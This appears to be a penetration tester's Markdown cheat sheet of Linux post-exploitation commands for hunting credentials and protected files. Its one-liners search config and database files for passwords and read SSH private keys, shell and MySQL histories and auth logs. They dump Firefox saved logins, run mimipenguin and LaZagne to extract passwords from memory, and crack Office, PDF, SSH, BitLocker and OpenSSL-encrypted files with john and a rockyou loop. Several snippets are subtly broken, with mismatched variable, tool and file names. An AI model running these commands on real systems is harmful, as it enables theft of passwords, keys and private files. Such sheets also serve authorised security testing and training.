# Credentials hunting on Linux 
#credentialhunt
#### Search config files 
```
for l in .conf .config .cnf;do echo -e "\nFile extension: $l"; find / -name *$l 2>/dev/null |grep -v 'lib\|fonts\|share\|core'; done
```
**Search in config file with filter:**
```
for l in .conf .config .cnf;do echo -e "\nFile extension: $l"; find / -name *$l 2>/dev/null | grep -v 'lib\|fonts\|share\|core' | grep 'user\|password\|pass'; done
```
**Find credentials in config files : (conf, config, conf)**
```
for i in $(find / -name *.cnf | grep -v "doc\|lib\|snap\|pulseaudio\|fonts" 2>/dev/null);do echo -e "\nFile: " $i; grep "user\|password\|passwd\|pass" $i |grep -v "\#";done
```
#### Search database files 
```
for i in $(echo ".sql .db .*db .db* .tdb" *.kdbx);do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
**Firefox database:**
```
find /home -name 'key4.db' 2>/dev/null | grep -v "man\|lib\|share" && find /home -name 'user*.json' 2>/dev/null | grep -v "man\|lib\|share"
```
#### Search notes 
```
find /home/* -type f -name "*.txt" -o ! -name "*.*" 2>/dev/null
```
#### Search scripts
```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|gnome\|profile";done
```
#### ⏰Cronjobs 
```
cat /etc/crontab && crontab -l
```
```
ls -la /etc/cron.*/
```
#### Find SSH keys 
- Private keys:
```
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
- Public keys:
```
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
#### History check
```
tail -n5 /home/*/.bash* /home/*/.mysql_history /root/.mysql_history /root/.bash*
```
#### Logs check 
```
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done | grep -v 'multipathd\|kernel\|pam_unix'
```
**Scan for logins:** (failed logins, sudo attempts, or SSH sessions)
```
grep -i "ssh\|sudo\|failure" /var/log/*
```

#### Memory and cache check for credentials 
- [mimipenguin](https://github.com/huntergregal/mimipenguin) 
```
sudo python3 mimipenguin.py
```
- Lazagne 
```
sudo python2 lazagne.py all
```
#### Firefox stored credentials (web credentials) 
**Tool:**
- Lazagne.py 
```
python3 lazagne.py browsers
```

- [firefox_decrypt](https://github.com/unode/firefox_decrypt) 
>Manual approach
```
ls -l /home/*/.mozilla/firefox/ /root/.mozilla | grep default
```
```
cat /home/*/.mozilla/firefox/*/logins.json | jq .
```

---
# Hunt for protected files/data
#### find protected files 
```
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

#### find ssh keys 
```
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```
#### find for encrypted ssh keys 
```
cat /home/*/.ssh/SSH.private
```
#### Cracking 
- MS office documents - `office2john`
- SSH - `ssh2john`
- PDF - `pdf2john`
- Bitlocker encryption (.vhd) - `bitlocker2john`

#### List of all file Extensions 
```
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```
#### Cracking OPENSSL archives/files 
```
file gzip.gzip
```
```
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```
#### Bit locker encryption 
```
bit2john -I backup.vhd > backup.hash
```
```
grep "bitlocker\$0" backup.hashes > backup.hash
```